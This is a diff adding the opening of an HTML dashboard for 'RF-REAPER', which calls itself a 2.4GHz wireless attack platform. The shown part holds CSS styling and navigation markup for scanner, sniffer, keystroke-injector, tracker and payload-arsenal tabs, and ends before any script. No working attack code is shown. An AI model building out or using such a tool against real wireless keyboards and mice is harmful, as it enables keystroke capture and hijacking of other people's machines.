@@ -1,0 +1,2372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RF-REAPER — Unified 2.4GHz Attack Platform</title>
+<meta name="description" content="RF-REAPER: Unified 2.4GHz wireless attack dashboard combining MouseJack, LOGITacker, KeySweeper, and Flipper Zero nRF24 capabilities.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════════════════════════════════════════════════════
+   RF-REAPER — CYBERPUNK DESIGN SYSTEM
+   ═══════════════════════════════════════════════════════════════ */
+
+:root {
+  --cyan: #00fff2;
+  --magenta: #ff00ff;
+  --green: #00ff88;
+  --red: #ff3355;
+  --yellow: #ffee00;
+  --orange: #ff8800;
+  --bg-deep: #0a0a12;
+  --bg-panel: rgba(10, 12, 28, 0.85);
+  --bg-card: rgba(15, 18, 35, 0.92);
+  --bg-input: rgba(8, 10, 22, 0.95);
+  --border-glow: rgba(0, 255, 242, 0.15);
+  --border-subtle: rgba(0, 255, 242, 0.08);
+  --text-primary: #e0e8ff;
+  --text-secondary: #7a88b0;
+  --text-dim: #3a4466;
+  --glass-blur: 16px;
+  --radius: 8px;
+  --radius-lg: 12px;
+  --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  --font-header: 'Orbitron', sans-serif;
+  --font-mono: 'JetBrains Mono', monospace;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { font-size: 14px; }
+
+body {
+  font-family: var(--font-mono);
+  background: var(--bg-deep);
+  color: var(--text-primary);
+  overflow-x: hidden;
+  min-height: 100vh;
+}
+
+/* ─── Animated Grid Background ─── */
+#grid-bg {
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background-image:
+    linear-gradient(rgba(0, 255, 242, 0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0, 255, 242, 0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  animation: gridPulse 8s ease-in-out infinite;
+}
+@keyframes gridPulse {
+  0%, 100% { opacity: 0.4; }
+  50% { opacity: 0.8; }
+}
+
+/* ─── Scanline Overlay ─── */
+#scanline-overlay {
+  position: fixed; inset: 0; z-index: 9999; pointer-events: none;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0, 0, 0, 0.06) 2px,
+    rgba(0, 0, 0, 0.06) 4px
+  );
+}
+#scanline-overlay::after {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(
+    180deg,
+    transparent 0%,
+    rgba(0, 255, 242, 0.02) 50%,
+    transparent 100%
+  );
+  height: 120px;
+  animation: scanMove 6s linear infinite;
+}
+@keyframes scanMove {
+  0% { transform: translateY(-120px); }
+  100% { transform: translateY(100vh); }
+}
+
+/* ─── Ambient Particles ─── */
+#particles-canvas {
+  position: fixed; inset: 0; z-index: 1; pointer-events: none;
+}
+
+/* ─── App Shell ─── */
+#app {
+  position: relative; z-index: 2;
+  display: flex; flex-direction: column;
+  min-height: 100vh;
+  padding: 0;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   TOP BAR
+   ═══════════════════════════════════════════════════════════════ */
+#topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 20px;
+  background: var(--bg-panel);
+  border-bottom: 1px solid var(--border-glow);
+  backdrop-filter: blur(var(--glass-blur));
+  -webkit-backdrop-filter: blur(var(--glass-blur));
+  flex-wrap: wrap; gap: 10px;
+}
+.topbar-brand {
+  display: flex; align-items: baseline; gap: 14px; flex-shrink: 0;
+}
+.topbar-logo {
+  font-family: var(--font-header);
+  font-size: 1.6rem; font-weight: 900;
+  background: linear-gradient(135deg, var(--cyan), var(--magenta));
+  -webkit-background-clip: text; background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-shadow: none;
+  filter: drop-shadow(0 0 12px rgba(0, 255, 242, 0.4));
+  letter-spacing: 2px;
+  animation: logoPulse 3s ease-in-out infinite;
+  user-select: none;
+}
+@keyframes logoPulse {
+  0%, 100% { filter: drop-shadow(0 0 12px rgba(0, 255, 242, 0.4)); }
+  50% { filter: drop-shadow(0 0 24px rgba(0, 255, 242, 0.7)); }
+}
+.topbar-subtitle {
+  font-size: 0.65rem;
+  color: var(--text-secondary);
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+}
+.topbar-status {
+  display: flex; align-items: center; gap: 16px; flex-wrap: wrap;
+}
+.status-badge {
+  display: flex; align-items: center; gap: 6px;
+  padding: 5px 12px;
+  border-radius: 20px;
+  font-size: 0.7rem; font-weight: 600;
+  text-transform: uppercase; letter-spacing: 0.8px;
+  border: 1px solid var(--border-glow);
+  background: var(--bg-card);
+}
+.status-badge .dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  flex-shrink: 0;
+}
+.status-badge.connected .dot {
+  background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+  animation: dotBlink 2s ease-in-out infinite;
+}
+.status-badge.disconnected .dot {
+  background: var(--red);
+  box-shadow: 0 0 6px var(--red);
+}
+@keyframes dotBlink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.4; }
+}
+.stat-item {
+  display: flex; flex-direction: column; align-items: center;
+  padding: 4px 12px;
+}
+.stat-value {
+  font-family: var(--font-header);
+  font-size: 1.1rem; font-weight: 700;
+  color: var(--cyan);
+  text-shadow: 0 0 10px rgba(0, 255, 242, 0.3);
+}
+.stat-label {
+  font-size: 0.55rem; color: var(--text-dim);
+  text-transform: uppercase; letter-spacing: 1px;
+  margin-top: 2px;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   MODE SELECTOR TABS
+   ═══════════════════════════════════════════════════════════════ */
+#mode-tabs {
+  display: flex; gap: 0;
+  background: var(--bg-panel);
+  border-bottom: 1px solid var(--border-glow);
+  padding: 0 12px;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+#mode-tabs::-webkit-scrollbar { display: none; }
+.mode-tab {
+  flex: 1; min-width: 140px;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  padding: 14px 16px;
+  font-family: var(--font-header);
+  font-size: 0.72rem; font-weight: 600;
+  color: var(--text-secondary);
+  text-transform: uppercase; letter-spacing: 1.2px;
+  background: transparent;
+  border: none; border-bottom: 2px solid transparent;
+  cursor: pointer;
+  transition: var(--transition);
+  position: relative;
+  white-space: nowrap;
+}
+.mode-tab:hover {
+  color: var(--text-primary);
+  background: rgba(0, 255, 242, 0.04);
+}
+.mode-tab.active {
+  color: var(--cyan);
+  border-bottom-color: var(--cyan);
+  background: rgba(0, 255, 242, 0.06);
+  text-shadow: 0 0 10px rgba(0, 255, 242, 0.3);
+}
+.mode-tab .tab-icon { font-size: 1rem; }
+.mode-tab::after {
+  content: '';
+  position: absolute; bottom: -1px; left: 50%; width: 0; height: 2px;
+  background: var(--cyan);
+  box-shadow: 0 0 12px var(--cyan);
+  transition: var(--transition);
+  transform: translateX(-50%);
+}
+.mode-tab.active::after { width: 100%; }
+
+/* ═══════════════════════════════════════════════════════════════
+   MAIN CONTENT AREA
+   ═══════════════════════════════════════════════════════════════ */
+#main-content {
+  flex: 1;
+  padding: 16px;
+  overflow-y: auto;
+}
+.mode-panel {
+  display: none;
+  animation: panelFadeIn 0.35s ease-out;
+}
+.mode-panel.active { display: block; }
+@keyframes panelFadeIn {
+  from { opacity: 0; transform: translateY(8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* ─── Glass Card ─── */
+.glass-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius-lg);
+  backdrop-filter: blur(var(--glass-blur));
+  -webkit-backdrop-filter: blur(var(--glass-blur));
+  padding: 16px;
+  transition: var(--transition);
+}
+.glass-card:hover {
+  border-color: rgba(0, 255, 242, 0.25);
+  box-shadow: 0 0 20px rgba(0, 255, 242, 0.05);
+}
+.card-header {
+  display: flex; align-items: center; justify-content: space-between;
+  margin-bottom: 14px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border-subtle);
+}
+.card-title {
+  font-family: var(--font-header);
+  font-size: 0.78rem; font-weight: 700;
+  color: var(--cyan);
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  display: flex; align-items: center; gap: 8px;
+}
+.card-title .icon { font-size: 1rem; }
+
+/* ─── Buttons ─── */
+.btn {
+  font-family: var(--font-mono);
+  font-size: 0.72rem; font-weight: 600;
+  padding: 8px 18px;
+  border-radius: var(--radius);
+  border: 1px solid var(--border-glow);
+  background: var(--bg-input);
+  color: var(--text-primary);
+  cursor: pointer;
+  transition: var(--transition);
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  display: inline-flex; align-items: center; gap: 6px;
+}
+.btn:hover {
+  background: rgba(0, 255, 242, 0.1);
+  border-color: rgba(0, 255, 242, 0.3);
+  box-shadow: 0 0 12px rgba(0, 255, 242, 0.1);
+}
+.btn:active { transform: scale(0.97); }
+.btn-primary {
+  background: linear-gradient(135deg, rgba(0, 255, 242, 0.15), rgba(0, 255, 242, 0.05));
+  border-color: rgba(0, 255, 242, 0.4);
+  color: var(--cyan);
+}
+.btn-primary:hover {
+  background: linear-gradient(135deg, rgba(0, 255, 242, 0.25), rgba(0, 255, 242, 0.1));
+  box-shadow: 0 0 20px rgba(0, 255, 242, 0.2);
+}
+.btn-danger {
+  border-color: rgba(255, 51, 85, 0.4);
+  color: var(--red);
+}
+.btn-danger:hover {
+  background: rgba(255, 51, 85, 0.12);
+  box-shadow: 0 0 12px rgba(255, 51, 85, 0.15);
+}
+.btn-inject {
+  font-family: var(--font-header);
+  font-size: 1rem; font-weight: 800;
+  padding: 16px 40px;
+  background: linear-gradient(135deg, rgba(255, 0, 255, 0.2), rgba(255, 51, 85, 0.15));
+  border: 2px solid var(--magenta);
+  color: var(--magenta);
+  border-radius: var(--radius-lg);
+  position: relative;
+  overflow: hidden;
+  letter-spacing: 3px;
+}
+.btn-inject::before {
+  content: '';
+  position: absolute; inset: -2px;
+  background: linear-gradient(45deg, var(--magenta), var(--cyan), var(--magenta));
+  opacity: 0;
+  z-index: -1;
+  transition: opacity 0.4s;
+  filter: blur(15px);
+}
+.btn-inject:hover::before { opacity: 0.4; }
+.btn-inject:hover {
+  background: linear-gradient(135deg, rgba(255, 0, 255, 0.35), rgba(255, 51, 85, 0.25));
+  box-shadow: 0 0 30px rgba(255, 0, 255, 0.3), 0 0 60px rgba(255, 0, 255, 0.1);
+  transform: scale(1.03);
+  text-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
+}
+.btn-inject:active { transform: scale(0.98); }
+.btn-inject.injecting {
+  animation: injectPulse 0.6s ease-in-out;
+}
+@keyframes injectPulse {
+  0% { box-shadow: 0 0 30px rgba(255, 0, 255, 0.3); }
+  50% { box-shadow: 0 0 60px rgba(255, 0, 255, 0.6), 0 0 100px rgba(255, 0, 255, 0.2); }
+  100% { box-shadow: 0 0 30px rgba(255, 0, 255, 0.3); }
+}
+
+/* ─── Inputs ─── */
+.input-field, .select-field, textarea.input-field {
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  padding: 8px 12px;
+  background: var(--bg-input);
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius);
+  color: var(--text-primary);
+  transition: var(--transition);
+  width: 100%;
+}
+.input-field:focus, .select-field:focus, textarea.input-field:focus {
+  outline: none;
+  border-color: rgba(0, 255, 242, 0.5);
+  box-shadow: 0 0 12px rgba(0, 255, 242, 0.1);
+}
+.select-field {
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%2300fff2' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 10px center;
+  padding-right: 30px;
+}
+textarea.input-field { resize: vertical; min-height: 80px; line-height: 1.6; }
+
+.form-group { margin-bottom: 12px; }
+.form-label {
+  display: block;
+  font-size: 0.65rem; font-weight: 600;
+  color: var(--text-secondary);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 5px;
+}
+
+/* ─── Grid helpers ─── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+.grid-auto { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
+.flex-row { display: flex; gap: 10px; align-items: center; }
+.flex-col { display: flex; flex-direction: column; gap: 10px; }
+.flex-1 { flex: 1; }
+.gap-16 { gap: 16px; }
+.mb-16 { margin-bottom: 16px; }
+.text-center { text-align: center; }
+
+/* ═══════════════════════════════════════════════════════════════
+   SCANNER MODE — Spectrum Analyzer
+   ═══════════════════════════════════════════════════════════════ */
+#spectrum-container {
+  position: relative;
+  height: 240px;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  border: 1px solid var(--border-subtle);
+  overflow: hidden;
+}
+#spectrum-canvas {
+  width: 100%; height: 100%;
+  display: block;
+}
+.spectrum-overlay {
+  position: absolute; top: 8px; right: 12px;
+  font-size: 0.6rem; color: var(--text-dim);
+  font-family: var(--font-mono);
+  pointer-events: none;
+}
+
+/* Detected devices table */
+.device-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.72rem;
+}
+.device-table th {
+  font-family: var(--font-header);
+  font-size: 0.6rem;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  padding: 8px 10px;
+  text-align: left;
+  border-bottom: 1px solid var(--border-subtle);
+}
+.device-table td {
+  padding: 8px 10px;
+  border-bottom: 1px solid rgba(0, 255, 242, 0.03);
+  vertical-align: middle;
+}
+.device-table tr:hover td {
+  background: rgba(0, 255, 242, 0.04);
+}
+.device-addr {
+  font-weight: 600;
+  color: var(--cyan);
+  font-size: 0.7rem;
+  cursor: pointer;
+}
+.device-addr:hover { text-decoration: underline; }
+.device-type-badge {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 10px;
+  font-size: 0.6rem;
+  font-weight: 600;
+  text-transform: uppercase;
+}
+.type-keyboard { background: rgba(0, 255, 136, 0.12); color: var(--green); border: 1px solid rgba(0, 255, 136, 0.2); }
+.type-mouse { background: rgba(0, 255, 242, 0.12); color: var(--cyan); border: 1px solid rgba(0, 255, 242, 0.2); }
+.type-unknown { background: rgba(122, 136, 176, 0.12); color: var(--text-secondary); border: 1px solid rgba(122, 136, 176, 0.15); }
+
+/* ═══════════════════════════════════════════════════════════════
+   SNIFFER MODE — Packet Log
+   ═══════════════════════════════════════════════════════════════ */
+.packet-log {
+  max-height: 340px;
+  overflow-y: auto;
+  font-size: 0.68rem;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  border: 1px solid var(--border-subtle);
+  padding: 4px;
+}
+.packet-log::-webkit-scrollbar { width: 6px; }
+.packet-log::-webkit-scrollbar-track { background: transparent; }
+.packet-log::-webkit-scrollbar-thumb { background: rgba(0, 255, 242, 0.15); border-radius: 3px; }
+
+.packet-entry {
+  display: grid;
+  grid-template-columns: 80px 40px 110px 1fr;
+  gap: 8px;
+  padding: 5px 8px;
+  border-bottom: 1px solid rgba(0, 255, 242, 0.02);
+  align-items: center;
+  animation: packetSlideIn 0.2s ease-out;
+}
+@keyframes packetSlideIn {
+  from { opacity: 0; transform: translateX(-10px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+.packet-entry:hover { background: rgba(0, 255, 242, 0.03); }
+.packet-time { color: var(--text-dim); font-size: 0.62rem; }
+.packet-chan { color: var(--yellow); font-weight: 600; }
+.packet-addr { color: var(--cyan); font-weight: 500; }
+.packet-hex { color: var(--text-secondary); word-break: break-all; }
+.packet-decoded {
+  grid-column: 1 / -1;
+  padding: 4px 8px;
+  margin-top: 2px;
+  background: rgba(0, 255, 136, 0.05);
+  border-radius: 4px;
+  color: var(--green);
+  font-size: 0.64rem;
+}
+
+/* Sniffer stats */
+.sniffer-stats {
+  display: flex; gap: 20px; flex-wrap: wrap;
+}
+.sniffer-stat {
+  display: flex; align-items: baseline; gap: 6px;
+}
+.sniffer-stat-val {
+  font-family: var(--font-header);
+  font-size: 1.3rem; font-weight: 700;
+}
+.sniffer-stat-label {
+  font-size: 0.6rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.8px;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   INJECTOR MODE
+   ═══════════════════════════════════════════════════════════════ */
+.inject-target-bar {
+  display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap;
+}
+.payload-type-tabs {
+  display: flex; gap: 0; border-radius: var(--radius); overflow: hidden;
+  border: 1px solid var(--border-glow);
+}
+.payload-type-tab {
+  padding: 8px 16px;
+  font-family: var(--font-mono);
+  font-size: 0.68rem; font-weight: 600;
+  background: var(--bg-input);
+  color: var(--text-secondary);
+  border: none; cursor: pointer;
+  transition: var(--transition);
+  text-transform: uppercase;
+}
+.payload-type-tab.active {
+  background: rgba(0, 255, 242, 0.12);
+  color: var(--cyan);
+}
+.payload-type-tab:hover:not(.active) {
+  background: rgba(0, 255, 242, 0.06);
+}
+
+.mouse-controls {
+  display: flex; gap: 20px; align-items: center; flex-wrap: wrap;
+}
+.slider-group { display: flex; flex-direction: column; gap: 4px; flex: 1; min-width: 120px; }
+.slider-group label {
+  font-size: 0.6rem; color: var(--text-dim);
+  text-transform: uppercase; letter-spacing: 0.8px;
+}
+input[type="range"] {
+  -webkit-appearance: none; width: 100%; height: 6px;
+  background: var(--bg-input);
+  border-radius: 3px; outline: none;
+  border: 1px solid var(--border-subtle);
+}
+input[type="range"]::-webkit-slider-thumb {
+  -webkit-appearance: none; width: 16px; height: 16px;
+  border-radius: 50%;
+  background: var(--cyan);
+  box-shadow: 0 0 8px rgba(0, 255, 242, 0.4);
+  cursor: pointer;
+}
+.checkbox-group {
+  display: flex; gap: 14px; align-items: center;
+}
+.checkbox-group label {
+  display: flex; align-items: center; gap: 5px;
+  font-size: 0.68rem; color: var(--text-secondary);
+  cursor: pointer;
+}
+.checkbox-group input[type="checkbox"] {
+  accent-color: var(--cyan);
+  width: 14px; height: 14px;
+}
+.inject-log {
+  max-height: 160px; overflow-y: auto;
+  font-size: 0.65rem;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  padding: 8px;
+  border: 1px solid var(--border-subtle);
+}
+.inject-log-entry {
+  padding: 3px 0;
+  border-bottom: 1px solid rgba(0, 255, 242, 0.02);
+  animation: packetSlideIn 0.15s ease-out;
+}
+.inject-log-entry .success { color: var(--green); }
+.inject-log-entry .fail { color: var(--red); }
+
+/* ═══════════════════════════════════════════════════════════════
+   TRACKER MODE
+   ═══════════════════════════════════════════════════════════════ */
+.signal-meter-bar {
+  height: 30px; width: 100%;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  overflow: hidden;
+  border: 1px solid var(--border-subtle);
+  position: relative;
+}
+.signal-meter-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--green), var(--yellow), var(--red));
+  border-radius: var(--radius);
+  transition: width 0.3s ease-out;
+  position: relative;
+}
+.signal-meter-fill::after {
+  content: '';
+  position: absolute; right: 0; top: 0; bottom: 0; width: 3px;
+  background: #fff;
+  box-shadow: 0 0 10px #fff, 0 0 20px var(--cyan);
+}
+.signal-meter-label {
+  position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+  font-family: var(--font-header);
+  font-size: 0.7rem; font-weight: 700;
+  color: var(--text-primary);
+  text-shadow: 0 0 8px rgba(0,0,0,0.8);
+}
+#tracker-graph-container {
+  height: 200px;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  border: 1px solid var(--border-subtle);
+  overflow: hidden;
+  position: relative;
+}
+#tracker-canvas { width: 100%; height: 100%; display: block; }
+.keystroke-log {
+  max-height: 160px; overflow-y: auto;
+  font-size: 0.8rem;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  padding: 10px 14px;
+  border: 1px solid var(--border-subtle);
+  color: var(--green);
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.8;
+  letter-spacing: 0.5px;
+}
+.keystroke-log .special-key {
+  display: inline-block;
+  padding: 1px 6px;
+  border-radius: 3px;
+  background: rgba(0, 255, 136, 0.1);
+  border: 1px solid rgba(0, 255, 136, 0.2);
+  font-size: 0.62rem;
+  vertical-align: middle;
+  margin: 0 2px;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   YICHIP MODE
+   ═══════════════════════════════════════════════════════════════ */
+.info-grid {
+  display: grid;
+  grid-template-columns: 130px 1fr;
+  gap: 6px 12px;
+  font-size: 0.72rem;
+}
+.info-key {
+  color: var(--text-dim);
+  text-transform: uppercase;
+  font-size: 0.6rem;
+  letter-spacing: 0.8px;
+  padding: 4px 0;
+}
+.info-val {
+  color: var(--text-primary);
+  font-weight: 500;
+  padding: 4px 0;
+}
+.info-val.highlight { color: var(--cyan); font-weight: 700; }
+.hid-descriptor {
+  font-size: 0.65rem;
+  max-height: 200px; overflow-y: auto;
+  background: var(--bg-input);
+  border-radius: var(--radius);
+  padding: 10px;
+  border: 1px solid var(--border-subtle);
+  color: var(--text-secondary);
+  white-space: pre;
+  line-height: 1.7;
+}
+.findings-list { list-style: none; }
+.findings-list li {
+  padding: 6px 0;
+  border-bottom: 1px solid var(--border-subtle);
+  font-size: 0.72rem;
+  display: flex; align-items: center; gap: 8px;
+}
+.findings-list .finding-icon { font-size: 0.9rem; }
+.finding-critical { color: var(--red); }
+.finding-warning { color: var(--yellow); }
+.finding-info { color: var(--cyan); }
+
+/* ═══════════════════════════════════════════════════════════════
+   BOTTOM BAR — Console
+   ═══════════════════════════════════════════════════════════════ */
+#bottombar {
+  background: var(--bg-panel);
+  border-top: 1px solid var(--border-glow);
+  backdrop-filter: blur(var(--glass-blur));
+  -webkit-backdrop-filter: blur(var(--glass-blur));
+}
+.console-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 6px 16px;
+  cursor: pointer;
+  user-select: none;
+}
+.console-title {
+  font-family: var(--font-header);
+  font-size: 0.6rem;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  display: flex; align-items: center; gap: 8px;
+}
+.console-toggle {
+  font-size: 0.7rem;
+  color: var(--text-dim);
+  transition: var(--transition);
+}
+.console-body {
+  max-height: 0; overflow: hidden;
+  transition: max-height 0.35s ease;
+}
+.console-body.open { max-height: 180px; }
+#console-log {
+  height: 150px; overflow-y: auto;
+  padding: 8px 16px;
+  font-size: 0.65rem;
+  color: var(--text-secondary);
+  line-height: 1.7;
+}
+#console-log::-webkit-scrollbar { width: 4px; }
+#console-log::-webkit-scrollbar-thumb { background: rgba(0,255,242,0.1); border-radius: 2px; }
+.console-line { animation: packetSlideIn 0.15s ease-out; }
+.console-line .ts { color: var(--text-dim); }
+.console-line .info { color: var(--cyan); }
+.console-line .warn { color: var(--yellow); }
+.console-line .err { color: var(--red); }
+.console-line .ok { color: var(--green); }
+
+.footer-tag {
+  text-align: center;
+  padding: 6px;
+  font-size: 0.55rem;
+  color: var(--text-dim);
+  letter-spacing: 1.2px;
+  text-transform: uppercase;
+  background: rgba(0,0,0,0.3);
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   PAYLOAD ARSENAL
+   ═══════════════════════════════════════════════════════════════ */
+.btn-os {
+  padding: 4px 10px; border-radius: 4px; font-size: 0.6rem;
+  font-family: var(--font-mono); border: 1px solid var(--border-subtle);
+  background: var(--bg-input); color: var(--text-secondary); cursor: pointer;
+  transition: var(--transition);
+}
+.btn-os:hover { border-color: var(--cyan); color: var(--cyan); }
+.btn-os.active { background: rgba(0,255,242,0.12); border-color: var(--cyan); color: var(--cyan); }
+
+.category-item {
+  padding: 8px 14px; cursor: pointer; display: flex; justify-content: space-between;
+  align-items: center; border-left: 3px solid transparent; font-size: 0.68rem;
+  transition: var(--transition); color: var(--text-secondary);
+}
+.category-item:hover { background: rgba(0,255,242,0.04); color: var(--text-primary); border-left-color: var(--cyan); }
+.category-item.active { background: rgba(0,255,242,0.08); color: var(--cyan); border-left-color: var(--cyan); }
+.category-item .cat-count {
+  background: rgba(0,255,242,0.08); padding: 1px 7px; border-radius: 8px;
+  font-size: 0.55rem; color: var(--cyan);
+}
+
+.payload-item {
+  padding: 10px 12px; border: 1px solid var(--border-subtle); border-radius: var(--radius);
+  margin-bottom: 6px; cursor: pointer; transition: var(--transition);
+  display: flex; align-items: center; gap: 10px;
+}
+.payload-item:hover { border-color: var(--cyan); background: rgba(0,255,242,0.03); transform: translateX(3px); }
+.payload-item.active { border-color: var(--cyan); background: rgba(0,255,242,0.06); box-shadow: 0 0 12px rgba(0,255,242,0.08); }
+.payload-item .pi-icon { font-size: 1.1rem; flex-shrink: 0; }
+.payload-item .pi-info { flex: 1; min-width: 0; }
+.payload-item .pi-name { font-size: 0.72rem; font-weight: 600; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.payload-item .pi-desc { font-size: 0.58rem; color: var(--text-dim); margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.payload-item .pi-os {
+  padding: 2px 6px; border-radius: 3px; font-size: 0.5rem; font-weight: 700;
+  text-transform: uppercase; flex-shrink: 0;
+}
+.pi-os-windows { background: rgba(0,120,255,0.15); color: #4da6ff; }
+.pi-os-macos { background: rgba(255,255,255,0.08); color: #ccc; }
+.pi-os-linux { background: rgba(255,170,0,0.12); color: #ffaa44; }
+
+.payload-script-preview {
+  background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: var(--radius);
+  padding: 12px; font-family: var(--font-mono); font-size: 0.62rem; line-height: 1.6;
+  color: var(--green); overflow-x: auto; max-height: 260px; overflow-y: auto; white-space: pre;
+  tab-size: 2;
+}
+.btn-sm { padding: 4px 10px; font-size: 0.58rem; }
+
+/* ═══════════════════════════════════════════════════════════════
+   RESPONSIVE
+   ═══════════════════════════════════════════════════════════════ */
+@media (max-width: 900px) {
+  .grid-2 { grid-template-columns: 1fr; }
+  .grid-3 { grid-template-columns: 1fr; }
+  .topbar-subtitle { display: none; }
+  .mode-tab { min-width: 100px; font-size: 0.62rem; padding: 10px 8px; }
+  .mode-tab .tab-label { display: none; }
+}
+@media (max-width: 600px) {
+  html { font-size: 12px; }
+  #topbar { padding: 8px 12px; }
+  #main-content { padding: 10px; }
+  .mode-tab { min-width: 60px; padding: 10px 6px; }
+  .packet-entry { grid-template-columns: 60px 30px 1fr; }
+  .packet-addr { display: none; }
+}
+
+/* ─── Scrollbar global ─── */
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
+::-webkit-scrollbar-thumb { background: rgba(0,255,242,0.1); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: rgba(0,255,242,0.2); }
+
+/* ─── Selection color ─── */
+::selection { background: rgba(0, 255, 242, 0.25); color: #fff; }
+
+/* ─── Loading skeleton ─── */
+.skeleton {
+  background: linear-gradient(90deg, var(--bg-input) 25%, rgba(0,255,242,0.04) 50%, var(--bg-input) 75%);
+  background-size: 200% 100%;
+  animation: shimmer 1.5s infinite;
+  border-radius: var(--radius);
+}
+@keyframes shimmer {
+  0% { background-position: -200% 0; }
+  100% { background-position: 200% 0; }
+}
+</style>
+</head>
+<body>
+
+<!-- Background Effects -->
+<div id="grid-bg"></div>
+<canvas id="particles-canvas"></canvas>
+<div id="scanline-overlay"></div>
+
+<!-- App -->
+<div id="app">
+
+  <!-- ═══ TOP BAR ═══ -->
+  <header id="topbar">
+    <div class="topbar-brand">
+      <span class="topbar-logo">⚡ RF-REAPER</span>
+      <span class="topbar-subtitle">Unified 2.4GHz Attack Platform — MouseJack + LOGITacker + KeySweeper + FlipperZero</span>
+    </div>
+    <div class="topbar-status">
+      <div class="status-badge disconnected" id="status-arduino">
+        <span class="dot"></span> Arduino
+      </div>
+      <div class="status-badge disconnected" id="status-yichip">
+        <span class="dot"></span> YICHIP
+      </div>
+      <div class="stat-item">
+        <span class="stat-value" id="stat-devices">0</span>
+        <span class="stat-label">Devices</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-value" id="stat-packets">0</span>
+        <span class="stat-label">Packets</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-value" id="stat-uptime">00:00:00</span>
+        <span class="stat-label">Uptime</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ═══ MODE TABS ═══ -->
+  <nav id="mode-tabs">
+    <button class="mode-tab active" data-mode="scanner" id="tab-scanner">
+      <span class="tab-icon">📡</span>
+      <span class="tab-label">Scanner</span>
+    </button>
+    <button class="mode-tab" data-mode="sniffer" id="tab-sniffer">
+      <span class="tab-icon">🔍</span>
+      <span class="tab-label">Sniffer</span>
+    </button>
+    <button class="mode-tab" data-mode="injector" id="tab-injector">
+      <span class="tab-icon">💉</span>
+      <span class="tab-label">Injector</span>
+    </button>
+    <button class="mode-tab" data-mode="tracker" id="tab-tracker">
+      <span class="tab-icon">🎯</span>
+      <span class="tab-label">Tracker</span>
+    </button>
+    <button class="mode-tab" data-mode="yichip" id="tab-yichip">
+      <span class="tab-icon">🔓</span>
+      <span class="tab-label">YICHIP</span>
+    </button>
+    <button class="mode-tab" data-mode="payloads" id="tab-payloads">
+      <span class="tab-icon">📚</span>
+      <span class="tab-label">Arsenal</span>
+    </button>
+  </nav>
+
+  <!-- ═══ MAIN CONTENT ═══ -->
+  <main id="main-content">
+
